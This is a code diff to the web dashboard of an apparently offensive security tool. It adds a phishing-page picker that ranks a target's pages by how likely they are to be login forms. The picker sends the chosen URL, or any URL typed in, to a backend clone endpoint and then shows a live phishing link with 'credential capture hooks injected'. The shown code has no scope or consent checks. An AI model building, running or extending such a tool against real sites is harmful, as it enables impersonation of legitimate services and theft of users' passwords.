@@ -176,6 +176,59 @@ a:hover{text-decoration:underline}
 .sys-card .sys-score{font-family:var(--mono);font-weight:900;font-size:18px}
 .sys-card .sys-stats{font-size:10px;color:var(--txt-dim);display:flex;gap:10px;flex-wrap:wrap}
 
+/* Phish page picker modal */
+.phish-overlay{position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.65);backdrop-filter:blur(6px);animation:fadeIn .15s}
+.phish-modal{position:fixed;z-index:9999;top:50%;left:50%;transform:translate(-50%,-50%);background:linear-gradient(180deg,#111120 0%,var(--bg) 100%);border:1px solid var(--border-lt);border-radius:14px;box-shadow:0 32px 100px rgba(0,0,0,.8),0 0 0 1px rgba(255,23,68,.06),0 0 60px rgba(255,23,68,.04);width:min(620px,94vw);max-height:min(600px,85vh);display:flex;flex-direction:column;animation:fadeIn .2s}
+.pm-head{padding:20px 24px 0;flex-shrink:0}
+.pm-head-row{display:flex;align-items:center;gap:12px}
+.pm-head h3{margin:0;font-size:16px;font-weight:900;color:var(--txt-br);flex:1;letter-spacing:-.2px}
+.pm-head .pm-domain{font-family:var(--mono);font-size:10px;color:var(--red);background:rgba(255,23,68,.08);padding:3px 10px;border-radius:20px;border:1px solid rgba(255,23,68,.15)}
+.pm-head .pm-close{background:none;border:1px solid var(--border);color:var(--txt-dim);width:28px;height:28px;display:flex;align-items:center;justify-content:center;font-size:16px;cursor:pointer;border-radius:6px;line-height:1;transition:all .12s}
+.pm-head .pm-close:hover{background:var(--bg3);color:var(--txt-br);border-color:var(--border-lt)}
+.pm-subtitle{font-size:10px;color:var(--txt-dim);margin-top:6px;line-height:1.5}
+.pm-scan-status{padding:10px 24px 6px;font-size:10px;flex-shrink:0;display:flex;align-items:center;gap:6px}
+.pm-scan-status .pm-pulse{width:6px;height:6px;border-radius:50%;background:var(--accent);animation:pmPulse 1.2s ease infinite}
+@keyframes pmPulse{0%,100%{opacity:1}50%{opacity:.3}}
+.pm-body{flex:1;overflow-y:auto;padding:4px 12px 8px;scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.pm-section-label{font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:1px;color:var(--txt-dim);padding:10px 12px 4px;display:flex;align-items:center;gap:6px}
+.pm-section-label .pm-sl-line{flex:1;height:1px;background:var(--border)}
+.pm-item{display:flex;align-items:flex-start;gap:12px;padding:10px 14px;margin:2px 0;cursor:pointer;border:1px solid transparent;border-radius:10px;transition:all .1s}
+.pm-item:hover{background:rgba(255,255,255,.02);border-color:var(--border)}
+.pm-item.pm-selected{background:rgba(255,23,68,.05);border-color:rgba(255,23,68,.2)}
+.pm-item .pm-dot{width:18px;height:18px;border:2px solid var(--border-lt);border-radius:50%;flex-shrink:0;margin-top:1px;transition:all .1s;display:flex;align-items:center;justify-content:center}
+.pm-item.pm-selected .pm-dot{border-color:var(--red)}
+.pm-item.pm-selected .pm-dot::after{content:'';width:8px;height:8px;border-radius:50%;background:var(--red)}
+.pm-item .pm-detail{flex:1;min-width:0}
+.pm-item .pm-path{font-family:var(--mono);font-size:12px;color:var(--txt-br);word-break:break-all;line-height:1.4}
+.pm-item .pm-full-url{font-family:var(--mono);font-size:9px;color:var(--txt-dim);word-break:break-all;margin-top:2px;line-height:1.3}
+.pm-item .pm-badges{display:flex;gap:4px;flex-wrap:wrap;margin-top:5px}
+.pm-badge{font-size:8px;font-weight:700;padding:2px 8px;border-radius:4px;white-space:nowrap;letter-spacing:.3px}
+.pm-b-cred{background:rgba(255,23,68,.12);color:var(--red);border:1px solid rgba(255,23,68,.15)}
+.pm-b-form{background:rgba(105,240,174,.08);color:var(--green);border:1px solid rgba(105,240,174,.12)}
+.pm-b-scan{background:rgba(0,229,255,.06);color:var(--accent);border:1px solid rgba(0,229,255,.1)}
+.pm-b-dim{background:var(--bg3);color:var(--txt-dim);border:1px solid var(--border)}
+.pm-best-pick{position:relative;border-color:rgba(255,23,68,.18);background:rgba(255,23,68,.03)}
+.pm-best-pick::before{content:'BEST PICK';position:absolute;top:-1px;right:12px;font-size:7px;font-weight:900;letter-spacing:1px;color:var(--red);background:var(--bg);padding:0 6px;transform:translateY(-50%)}
+.pm-foot{padding:14px 24px 18px;border-top:1px solid var(--border);flex-shrink:0}
+.pm-foot-row{display:flex;gap:8px;align-items:center}
+.pm-foot input{flex:1;background:var(--bg3);border:1px solid var(--border);color:var(--txt-br);font-family:var(--mono);font-size:11px;padding:10px 14px;border-radius:8px;outline:none;transition:border-color .12s}
+.pm-foot input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,229,255,.08)}
+.pm-clone-btn{font-size:12px;font-weight:800;padding:10px 28px;border-radius:8px;border:none;background:var(--red);color:#fff;cursor:pointer;white-space:nowrap;transition:all .15s;text-transform:uppercase;letter-spacing:.5px}
+.pm-clone-btn:hover{background:#ff2d55;box-shadow:0 0 24px rgba(255,23,68,.3);transform:translateY(-1px)}
+.pm-clone-btn:active{transform:translateY(0)}
+.pm-clone-btn:disabled{opacity:.4;cursor:default;box-shadow:none;transform:none}
+.pm-foot-hint{font-size:9px;color:var(--txt-dim);margin-top:8px}
+.pm-success{padding:32px 24px;text-align:center;flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px}
+.pm-success-icon{font-size:48px;line-height:1}
+.pm-success h4{font-size:16px;font-weight:800;color:var(--green);margin:0}
+.pm-success-url{font-family:var(--mono);font-size:12px;color:var(--accent);background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:10px 16px;word-break:break-all;width:100%;text-align:left;user-select:all;cursor:text}
+.pm-success-actions{display:flex;gap:8px;margin-top:8px}
+.pm-success-actions a,.pm-success-actions button{font-size:11px;font-weight:700;padding:8px 20px;border-radius:6px;cursor:pointer;transition:all .12s;text-decoration:none}
+.pm-success-actions a{background:rgba(0,229,255,.1);border:1px solid var(--accent);color:var(--accent)}
+.pm-success-actions a:hover{background:rgba(0,229,255,.2);text-decoration:none}
+.pm-success-actions button{background:var(--bg3);border:1px solid var(--border);color:var(--txt)}
+.pm-success-actions button:hover{border-color:var(--border-lt)}
+
 /* Toolbar */
 .toolbar{display:flex;gap:8px;margin-bottom:16px;align-items:center;flex-wrap:wrap}
 .btn{background:var(--bg3);border:1px solid var(--border);color:var(--txt);padding:6px 14px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;font-family:var(--sans);transition:all .18s var(--ease)}
@@ -464,6 +517,44 @@ a:hover{text-decoration:underline}
 @keyframes pulseGlow{0%,100%{filter:drop-shadow(0 0 4px rgba(0,229,255,.15))}50%{filter:drop-shadow(0 0 14px rgba(0,229,255,.35))}}
 .skeleton{background:linear-gradient(90deg,var(--bg3) 25%,rgba(255,255,255,.04) 50%,var(--bg3) 75%);background-size:200% 100%;animation:shimmer 1.6s infinite;border-radius:4px}
 .exec-risk-card svg{animation:pulseGlow 3s ease-in-out infinite}
+.phish-dash-card{background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--red);border-radius:6px;padding:14px 16px}
+.phish-dash-card:hover{border-color:var(--border-lt);box-shadow:0 2px 12px rgba(0,0,0,.3)}
+
+/* ─── System Deep-Dive Modal ──────────────────────────────────── */
+.sys-modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(6px);z-index:9998;display:flex;align-items:center;justify-content:center;animation:fadeIn .2s}
+.sys-modal{background:var(--bg);border:1px solid var(--border);border-radius:10px;width:95vw;max-width:960px;max-height:90vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,.6);animation:modalIn .25s ease-out}
+@keyframes modalIn{from{opacity:0;transform:translateY(12px) scale(.97)}to{opacity:1;transform:translateY(0) scale(1)}}
+.sys-modal-head{display:flex;align-items:center;gap:12px;padding:16px 20px;border-bottom:1px solid var(--border);flex-shrink:0;background:var(--bg2)}
+.sys-modal-head h3{font-size:16px;font-weight:800;color:var(--txt-br);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin:0}
+.sys-modal-domain{font-size:10px;font-family:var(--mono);color:var(--accent);background:rgba(0,229,255,.08);padding:2px 8px;border-radius:10px;border:1px solid rgba(0,229,255,.2);flex-shrink:0}
+.sys-modal-score{font-family:var(--mono);font-weight:900;font-size:22px;flex-shrink:0}
+.sys-modal-close{background:none;border:1px solid var(--border);color:var(--txt-dim);width:28px;height:28px;border-radius:50%;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .15s}
+.sys-modal-close:hover{color:var(--txt);border-color:var(--red);background:rgba(255,23,68,.1)}
+.sys-modal-tabs{display:flex;border-bottom:1px solid var(--border);flex-shrink:0;background:var(--bg2);overflow-x:auto;scrollbar-width:none}
+.sys-modal-tabs::-webkit-scrollbar{display:none}
+.smt{background:none;border:none;border-bottom:2px solid transparent;color:var(--txt-dim);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.3px;padding:9px 14px;cursor:pointer;white-space:nowrap;font-family:var(--sans);transition:color .15s}
+.smt:hover{color:var(--txt)}
+.smt.active{color:var(--accent);border-bottom-color:var(--accent)}
+.sys-modal-body{flex:1;overflow-y:auto;padding:16px 20px}
+.smp{display:none}
+.smp.active{display:block}
+.sm-stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:10px;margin-bottom:16px}
+.sm-stat{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:10px;text-align:center}
+.sm-stat-val{font-family:var(--mono);font-weight:900;font-size:20px}
+.sm-stat-lbl{font-size:9px;color:var(--txt-dim);text-transform:uppercase;letter-spacing:.3px}
+.sm-section{margin-bottom:16px}
+.sm-section-title{font-size:11px;font-weight:800;color:var(--txt-dim);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;font-family:var(--mono)}
+.sm-endpoint-row{display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid rgba(30,30,50,.4);font-size:11px}
+.sm-method-badge{font-family:var(--mono);font-size:9px;font-weight:800;padding:1px 6px;border-radius:3px;flex-shrink:0}
+.sm-method-GET{background:rgba(105,240,174,.12);color:var(--green)}
+.sm-method-POST{background:rgba(0,229,255,.12);color:var(--accent)}
+.sm-method-PUT{background:rgba(255,234,0,.12);color:var(--yellow)}
+.sm-method-DELETE{background:rgba(255,23,68,.12);color:var(--red)}
+.sm-method-PATCH{background:rgba(179,136,255,.12);color:var(--purple)}
+.sm-header-row{display:flex;justify-content:space-between;font-size:11px;padding:4px 0;border-bottom:1px solid rgba(30,30,50,.4)}
+.sm-header-present{color:var(--green);font-weight:700;font-family:var(--mono)}
+.sm-header-missing{color:var(--red);font-weight:700;font-family:var(--mono)}
+.sm-attack-btn{font-size:11px;padding:6px 14px;border-radius:4px;cursor:pointer;font-weight:700;transition:all .15s}
 </style>
 </head>
 <body>
@@ -695,6 +786,7 @@ function renderDetail(){
   const sum=s.summary||{};
   const dur=s.endedAt&&s.startedAt?new Date(s.endedAt)-new Date(s.startedAt):0;
   const events=s.events||[];
+  window._lastLoadedEvents = events;
   const findings=dedup(events.filter(e=>e.type==='finding'));
   const systems=buildSystems(events);
 
@@ -763,12 +855,14 @@ function renderDetail(){
       <div class="tab" data-tab="graph">Attack Graph</div>
       <div class="tab" data-tab="specs">API Specs</div>
       <div class="tab" data-tab="events">Events (${events.length})</div>
+      <div class="tab" data-tab="phish">Phish</div>
     </div>
     <div class="tab-panel active" id="panel-findings">${renderFindings(findings)}</div>
     <div class="tab-panel" id="panel-systems">${renderSystems(systems,findings)}</div>
     <div class="tab-panel" id="panel-graph"><div id="graph-root"></div></div>
     <div class="tab-panel" id="panel-specs">${renderSpecsPanel()}</div>
     <div class="tab-panel" id="panel-events">${renderEvents(events)}</div>
+    <div class="tab-panel" id="panel-phish"><div id="phish-dashboard-root" style="padding:8px"><div class="phish-dash-loading" style="color:var(--txt-dim);text-align:center;padding:24px">Loading phish sites\u2026</div></div></div>
     <div class="print-report" style="display:none" id="print-report"></div>`;
   document.getElementById('main-content').innerHTML=html;
 
@@ -780,6 +874,7 @@ function renderDetail(){
     t.classList.add('active');
     document.getElementById('panel-'+t.dataset.tab).classList.add('active');
     if(t.dataset.tab==='graph') autoLoadGraph();
+    if(t.dataset.tab==='phish') loadPhishDashboard();
   }));
 
   document.querySelectorAll('.sev-filter').forEach(b=>b.addEventListener('click',()=>{
@@ -837,23 +932,41 @@ function filterFindings(findings,sev){
   return res.filter(f=>f.data?.severity===sev);
 }
 
+function _credPageScore(url){
+  try{
+    const p=new URL(url).pathname.toLowerCase();
+    const credKw=/\/(login|signin|sign-in|log-in|auth|authenticate|sso|oauth|register|signup|sign-up|password|forgot|reset|account|credential|mfa|2fa|verify|enroll|onboard|welcome)\b/;
+    const apiPat=/\/(api|graphql|v[0-9]|_next|static|assets|favicon|manifest|sw\.js|\.well-known)\b|\.(json|xml|ico|png|jpg|svg|woff|css|js)$/;
+    if(apiPat.test(p))return -10;
+    let score=0;
+    if(credKw.test(p))score+=50;
+    const depth=p.split('/').filter(Boolean).length;
+    score+=Math.max(0,5-depth);
+    return score;
+  }catch{return -10}
+}
+
 function buildSystems(events){
   const map=new Map();
   for(const e of events){
     const sid=e.data?.systemId;if(!sid)continue;
-    if(!map.has(sid))map.set(sid,{id:sid,name:sid,findings:0,requests:0,sampleUrls:[],methods:new Set()});
+    if(!map.has(sid))map.set(sid,{id:sid,name:sid,findings:0,requests:0,sampleUrls:[],_seenPaths:new Set(),methods:new Set()});
     const s=map.get(sid);
     if(e.type==='finding')s.findings++;
     if(e.type==='request'){
       s.requests++;
-      if(e.data?.url&&s.sampleUrls.length<10)s.sampleUrls.push(e.data.url);
+      if(e.data?.url&&s.sampleUrls.length<50){
+        try{const p=new URL(e.data.url).pathname;if(!s._seenPaths.has(p)){s._seenPaths.add(p);s.sampleUrls.push(e.data.url)}}catch{s.sampleUrls.push(e.data.url)}
+      }
       if(e.data?.method)s.methods.add(e.data.method);
     }
   }
   return [...map.values()].map(s=>{
     const domains=[];
     for(const u of s.sampleUrls){try{const h=new URL(u).hostname;if(h&&!domains.includes(h))domains.push(h)}catch{}}
-    return {...s,domains,methods:[...s.methods]};
+    const credPages=[...s.sampleUrls].map(u=>({url:u,score:_credPageScore(u)})).sort((a,b)=>b.score-a.score);
+    delete s._seenPaths;
+    return {...s,domains,methods:[...s.methods],credPages};
   }).sort((a,b)=>b.findings-a.findings);
 }
 
@@ -1483,23 +1596,257 @@ window.copyToClipboard=function(btn,text){
 };
 
 // ─── Phish Clone ────────────────────────────────────────────────────
-window.clonePhish=async function(domain,btn){
-  const wrap=btn.parentElement;
-  btn.textContent='Cloning\u2026';btn.disabled=true;btn.style.opacity='.5';
+window.clonePhish=async function(fullUrl,wrapEl){
+  const cloneBtn=document.querySelector('.pm-clone-btn');
+  const statusEl=document.querySelector('.pm-scan-status');
+  if(cloneBtn){cloneBtn.textContent='CLONING\u2026';cloneBtn.disabled=true;}
+  if(statusEl)statusEl.innerHTML='<span class="pm-pulse"></span> <span style="color:var(--accent)">Cloning page and injecting capture hooks\u2026</span>';
   try{
-    const r=await fetch('/r3d/attack/phish/clone',{method:'POST',headers:authHeaders({'Content-Type':'application/json'}),body:JSON.stringify({url:'https://'+domain+'/',useAuthContext:true})});
+    const r=await fetch('/r3d/attack/phish/clone',{method:'POST',headers:authHeaders({'Content-Type':'application/json'}),body:JSON.stringify({url:fullUrl,useAuthContext:true})});
     const data=await r.json();
     if(data.ok){
       const serveUrl=location.origin+data.serveUrl;
-      wrap.innerHTML=`<a href="${data.serveUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--red);text-decoration:none;padding:2px 6px;border:1px solid var(--red);border-radius:3px;opacity:.9" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.9'">PHISH LIVE</a>`
+      wrapEl.innerHTML=`<a href="${data.serveUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--red);text-decoration:none;padding:2px 6px;border:1px solid var(--red);border-radius:3px;opacity:.9" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.9'">PHISH LIVE</a>`
         +`<button onclick="copyToClipboard(this,'${serveUrl}')" style="font-size:9px;font-weight:600;color:var(--txt);padding:2px 6px;border:1px solid var(--border);border-radius:3px;background:var(--bg3);cursor:pointer">Copy Link</button>`;
+      _pmShowSuccess(serveUrl,data.serveUrl,data.assetsCloned||0,data.formsDetected||0);
     } else {
-      btn.textContent='Failed';btn.style.color='var(--orange)';
+      const errMsg=data.error||'Clone failed — the target may be blocking requests.';
+      if(cloneBtn){cloneBtn.textContent='RETRY';cloneBtn.disabled=false;cloneBtn.style.background='var(--orange)';}
+      if(statusEl)statusEl.innerHTML=`<span style="color:var(--orange)">\u26A0 ${esc(errMsg)}</span>`;
     }
   }catch(e){
-    btn.textContent='Error';btn.style.color='var(--orange)';
+    if(cloneBtn){cloneBtn.textContent='RETRY';cloneBtn.disabled=false;cloneBtn.style.background='var(--orange)';}
+    if(statusEl)statusEl.innerHTML='<span style="color:var(--orange)">\u26A0 Network error \u2014 is the proxy running?</span>';
   }
 };
+
+function _pmShowSuccess(fullServeUrl,path,assets,forms){
+  if(!_phishModal)return;
+  const body=_phishModal.querySelector('.pm-body');
+  const foot=_phishModal.querySelector('.pm-foot');
+  const status=_phishModal.querySelector('.pm-scan-status');
+  if(body)body.innerHTML=`<div class="pm-success">
+    <div class="pm-success-icon">\u2705</div>
+    <h4>Phishing Page Live</h4>
+    <div style="font-size:11px;color:var(--txt-dim)">Cloned ${assets} asset${assets!==1?'s':''}, ${forms} form${forms!==1?'s':''} detected. Credential capture hooks injected.</div>
+    <div class="pm-success-url">${esc(fullServeUrl)}</div>
+    <div class="pm-success-actions">
+      <a href="${esc(path)}" target="_blank">Open Page</a>
+      <button onclick="copyToClipboard(this,'${esc(fullServeUrl)}')">Copy Link</button>
+      <button onclick="_closePhishModal()">Done</button>
+    </div>
+  </div>`;
+  if(foot)foot.style.display='none';
+  if(status)status.innerHTML='<span style="color:var(--green)">\u2713 Clone complete \u2014 credential capture active</span>';
+}
+
+// ─── Phish Page Picker (Modal) ──────────────────────────────────────
+var _phishOverlay=null;
+var _phishModal=null;
+var _phishWrap=null;
+
+window._closePhishModal=function(){
+  if(_phishOverlay){_phishOverlay.remove();_phishOverlay=null;}
+  if(_phishModal){_phishModal.remove();_phishModal=null;}
+  _phishWrap=null;
+  document.removeEventListener('keydown',_pmKeyHandler);
+};
+function _pmKeyHandler(e){
+  if(e.key==='Escape'){_closePhishModal();return;}
+  if(!_phishModal)return;
+  if(e.key==='Enter'){e.preventDefault();_pmClone();return;}
+  if(e.key==='ArrowDown'||e.key==='ArrowUp'){
+    e.preventDefault();
+    const items=[..._phishModal.querySelectorAll('.pm-item')];
+    if(!items.length)return;
+    const cur=items.findIndex(x=>x.classList.contains('pm-selected'));
+    let next=e.key==='ArrowDown'?cur+1:cur-1;
+    if(next<0)next=items.length-1;
+    if(next>=items.length)next=0;
+    _pmSelect(items[next]);
+    items[next].scrollIntoView({block:'nearest'});
+  }
+}
+
+window.openPhishPicker=function(systemId,domain,btn){
+  if(_phishModal){_closePhishModal();return;}
+  const sys=_systemsMap[systemId];
+  if(!sys)return;
+  _phishWrap=btn.parentElement;
+
+  const defaultUrl='https://'+domain+'/';
+  let pages=(sys.credPages||[]).slice();
+  const hasRoot=pages.some(p=>{try{return new URL(p.url).pathname==='/'}catch{return false}});
+  if(!hasRoot)pages.unshift({url:defaultUrl,score:5});
+
+  let selectedUrl=pages.length?pages[0].url:defaultUrl;
+
+  function buildBadges(p){
+    const tags=[];
+    if(p.serverReason){
+      p.serverReason.split(', ').forEach(r=>{
+        if(/password field/i.test(r))tags.push('<span class="pm-badge pm-b-cred">PASSWORD FIELD</span>');
+        else if(/form/i.test(r))tags.push('<span class="pm-badge pm-b-form">'+esc(r).toUpperCase()+'</span>');
+        else if(/login.*title/i.test(r))tags.push('<span class="pm-badge pm-b-cred">LOGIN PAGE</span>');
+        else if(/oauth|sso/i.test(r))tags.push('<span class="pm-badge pm-b-scan">SSO / OAUTH</span>');
+        else if(/username|email/i.test(r))tags.push('<span class="pm-badge pm-b-scan">'+esc(r).toUpperCase()+'</span>');
+        else if(/credential/i.test(r))tags.push('<span class="pm-badge pm-b-cred">'+esc(r).toUpperCase()+'</span>');
+        else if(r&&!/^HTTP/i.test(r)&&!/not HTML/i.test(r))tags.push('<span class="pm-badge pm-b-dim">'+esc(r).toUpperCase()+'</span>');
+      });
+    }
+    if(!tags.length&&p.score>=50)tags.push('<span class="pm-badge pm-b-cred">LIKELY LOGIN</span>');
+    if(!tags.length&&p.score<=-10)tags.push('<span class="pm-badge pm-b-dim">STATIC ASSET</span>');
+    return tags;
+  }
+
+  function renderList(items,selOverride){
+    const selUrl=selOverride||selectedUrl;
+    if(!items.length)return '<div style="padding:32px;color:var(--txt-dim);text-align:center;font-size:11px">No pages observed yet.<br>Enter a URL below to clone any page.</div>';
+    const recommended=items.filter(p=>p.score>=20);
+    const others=items.filter(p=>p.score<20);
+    let html='';
+    if(recommended.length){
+      html+='<div class="pm-section-label"><span>Recommended</span><span class="pm-sl-line"></span></div>';
+      html+=recommended.map((p,i)=>_renderItem(p,selUrl,i===0&&p.score>=50,buildBadges)).join('');
+    }
+    if(others.length){
+      html+='<div class="pm-section-label"><span>All Pages</span><span class="pm-sl-line"></span></div>';
+      html+=others.map(p=>_renderItem(p,selUrl,false,buildBadges)).join('');
+    }
+    if(!recommended.length&&!others.length)html=renderList([]);
+    return html;
+  }
+
+  function _renderItem(p,selUrl,isBest,badgeFn){
+    const fullUrl=p.url;
+    let pathDisplay,hostDisplay;
+    try{const u=new URL(fullUrl);pathDisplay=u.pathname+u.search||'/';hostDisplay=u.hostname}catch{pathDisplay=fullUrl;hostDisplay=''}
+    const sel=fullUrl===selUrl?' pm-selected':'';
+    const best=isBest?' pm-best-pick':'';
+    const tags=badgeFn(p);
+    return `<div class="pm-item${sel}${best}" data-url="${esc(fullUrl)}" onclick="_pmSelect(this)" ondblclick="_pmClone()">
+      <div class="pm-dot"></div>
+      <div class="pm-detail">
+        <div class="pm-path">${esc(pathDisplay)}</div>
+        ${hostDisplay?'<div class="pm-full-url">'+esc(hostDisplay+pathDisplay)+'</div>':''}
+        ${tags.length?'<div class="pm-badges">'+tags.join('')+'</div>':''}
+      </div>
+    </div>`;
+  }
+
+  const overlay=document.createElement('div');
+  overlay.className='phish-overlay';
+  overlay.onclick=function(e){if(e.target===overlay)_closePhishModal();};
+
+  const modal=document.createElement('div');
+  modal.className='phish-modal';
+  modal.innerHTML=`
+    <div class="pm-head">
+      <div class="pm-head-row">
+        <h3>Clone Phishing Page</h3>
+        <span class="pm-domain">${esc(domain)}</span>
+        <button class="pm-close" onclick="_closePhishModal()" title="Close (Esc)">&times;</button>
+      </div>
+      <div class="pm-subtitle">Select a page to clone with credential capture. Pages with login forms are detected automatically and ranked first.</div>
+    </div>
+    <div class="pm-scan-status"></div>
+    <div class="pm-body">${renderList(pages)}</div>
+    <div class="pm-foot">
+      <div class="pm-foot-row">
+        <input type="text" value="${esc(selectedUrl)}" placeholder="Or enter any URL to clone..." onfocus="this.select()" oninput="_pmCustom(this)">
+        <button class="pm-clone-btn" onclick="_pmClone()">Clone</button>
+      </div>
+      <div class="pm-foot-hint">\u2191\u2193 navigate &middot; Enter to clone &middot; Double-click any page &middot; Esc to close</div>
+    </div>`;
+
+  document.body.appendChild(overlay);
+  document.body.appendChild(modal);
+  _phishOverlay=overlay;
+  _phishModal=modal;
+  modal._systemId=systemId;
+  modal._domain=domain;
+  modal._pages=pages;
+  modal._selectedUrl=selectedUrl;
+  modal._renderList=renderList;
+  modal._buildBadges=buildBadges;
+
+  document.addEventListener('keydown',_pmKeyHandler);
+  _phishSuggest(systemId,domain,pages,modal);
+};
+
+window._pmSelect=function(el){
+  const modal=el.closest('.phish-modal');
+  if(!modal)return;
+  modal.querySelectorAll('.pm-item').forEach(x=>x.classList.remove('pm-selected'));
+  el.classList.add('pm-selected');
+  modal._selectedUrl=el.dataset.url;
+  const inp=modal.querySelector('.pm-foot input');
+  if(inp)inp.value=el.dataset.url;
+};
+
+window._pmCustom=function(inp){
+  const modal=inp.closest('.phish-modal');
+  if(!modal)return;
+  modal._selectedUrl=inp.value;
+  modal.querySelectorAll('.pm-item').forEach(x=>{
+    x.classList.toggle('pm-selected',x.dataset.url===inp.value);
+  });
+};
+
+window._pmClone=function(){
+  if(!_phishModal)return;
+  let url=_phishModal._selectedUrl||'';
+  if(!url)return;
+  const domain=_phishModal._domain;
+  if(!url.startsWith('http'))url='https://'+domain+url;
+  const wrap=_phishWrap;
+  if(wrap)clonePhish(url,wrap);
+};
+
+async function _phishSuggest(systemId,domain,pages,modal){
+  const urls=pages.map(p=>p.url);
+  if(!urls.length)return;
+  const statusEl=modal.querySelector('.pm-scan-status');
+  const listEl=modal.querySelector('.pm-body');
+  if(!statusEl||!listEl)return;
+  statusEl.innerHTML='<span class="pm-pulse"></span> <span style="color:var(--accent)">Scanning '+urls.length+' page'+(urls.length>1?'s':'')+' for login forms\u2026</span>';
+
+  try{
+    const r=await fetch('/r3d/attack/phish/suggest',{method:'POST',headers:authHeaders({'Content-Type':'application/json'}),body:JSON.stringify({urls:urls.slice(0,15),useAuthContext:true})});
+    const data=await r.json();
+    if(!data.ok||!data.suggestions){statusEl.textContent='';return;}
+
+    const scoreMap=new Map();
+    data.suggestions.forEach(s=>scoreMap.set(s.url,s));
+
+    const merged=pages.map(p=>{
+      const srv=scoreMap.get(p.url);
+      const serverScore=srv?srv.score:0;
+      return {url:p.url,score:p.score+serverScore,clientScore:p.score,serverScore,serverReason:srv?.reason||null};
+    });
+    merged.sort((a,b)=>b.score-a.score);
+
+    modal._pages=merged;
+    const best=merged.find(m=>m.score>=50);
+    if(best)modal._selectedUrl=best.url;
+    else if(merged.length)modal._selectedUrl=merged[0].url;
+
+    if(!_phishModal||_phishModal!==modal)return;
+
+    const credCount=merged.filter(m=>m.score>=50).length;
+    if(credCount){
+      statusEl.innerHTML=`<span style="color:var(--green)">\u2713 Found ${credCount} credential page${credCount>1?'s':''} \u2014 best pick auto-selected</span>`;
+    } else {
+      statusEl.innerHTML='<span style="color:var(--txt-dim)">Scan complete \u2014 no login forms detected. Pick any page or enter a custom URL.</span>';
+    }
+
+    listEl.innerHTML=modal._renderList(merged,modal._selectedUrl);
+    const inp=modal.querySelector('.pm-foot input');
+    if(inp)inp.value=modal._selectedUrl;
+  }catch(e){
+    if(statusEl)statusEl.innerHTML='<span style="color:var(--orange)">\u26A0 Scan failed \u2014 select a page manually.</span>';
+  }
+}
 
 let _lastTestId=null;
 
@@ -3112,8 +3459,10 @@ function renderStructured(s,type){
   return execHeader+(fb||`<pre style="font-size:10px;color:var(--txt-dim);white-space:pre-wrap">${esc(JSON.stringify(s,null,2))}</pre>`);
 }
 
+var _systemsMap={};
 function renderSystems(systems,findings){
   if(!systems.length)return '<div style="color:var(--txt-dim);padding:24px;text-align:center">No systems detected.</div>';
+  systems.forEach(s=>{_systemsMap[s.id]=s});
   return systems.map(s=>{
     const sysFindings=findings.filter(f=>f.data?.systemId===s.id);
     const domain=(s.domains||[])[0]||'';
@@ -3121,12 +3470,12 @@ function renderSystems(systems,findings){
     const corsUrl=domain?'/r3d/prove?test=cors&url='+encodeURIComponent('https://'+domain):'';
     return `<div class="sys-card" style="flex-wrap:wrap">
       <input type="checkbox" class="pick-cb" onchange="togglePick('systems','${esc(s.id)}','${esc(s.name)}',this)" ${_picked.systems.has(s.id)?'checked':''}>
-      <span class="sys-name">${esc(s.name)}</span>
+      <span class="sys-name" style="cursor:pointer;text-decoration:underline;text-decoration-color:var(--border-lt);text-underline-offset:2px" onclick="openSystemModal('${esc(s.id)}')" title="Deep dive into ${esc(s.name)}">${esc(s.name)}</span>
       <div class="sys-stats"><span>${s.findings} findings</span><span>${s.requests} requests</span></div>
       <div style="display:flex;gap:6px;margin-left:auto;align-items:center">
         ${probeUrl?`<a href="${probeUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--accent);text-decoration:none;padding:2px 6px;border:1px solid var(--accent);border-radius:3px;opacity:.8" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.8'">HEADERS</a>`:''}
         ${corsUrl?`<a href="${corsUrl}" target="_blank" style="font-size:9px;font-weight:700;color:var(--orange);text-decoration:none;padding:2px 6px;border:1px solid var(--orange);border-radius:3px;opacity:.8" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.8'">CORS</a>`:''}
-        ${domain?`<span id="phish-ctl-${esc(domain)}"><button onclick="clonePhish('${esc(domain)}',this)" style="font-size:9px;font-weight:700;color:var(--red);padding:2px 6px;border:1px solid var(--red);border-radius:3px;background:transparent;cursor:pointer;opacity:.8" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.8'" title="Clone this system as a phishing site with credential capture">PHISH</button></span>`:''}
+        ${domain?`<span id="phish-ctl-${esc(domain)}" style="position:relative"><button onclick="openPhishPicker('${esc(s.id)}','${esc(domain)}',this)" style="font-size:9px;font-weight:700;color:var(--red);padding:2px 6px;border:1px solid var(--red);border-radius:3px;background:transparent;cursor:pointer;opacity:.8" onmouseover="this.style.opacity='1'" onmouseout="this.style.opacity='.8'" title="Pick a page to clone as a phishing site">PHISH</button></span>`:''}
         <button class="btn-explain" onclick="explainSystem('${esc(s.id)}','${esc(s.name)}',this)" title="Quick AI summary of this system's risk posture">Explain</button>
         <button class="btn btn-ai" onclick="analyzeSystem('${esc(s.id)}','${esc(s.name)}',${s.findings},${s.requests},this)" title="Deep AI risk assessment: attack vectors, hardening recs, compliance gaps">Risk Assessment</button>
       </div>
@@ -3444,14 +3793,59 @@ function _handleSSE(e){
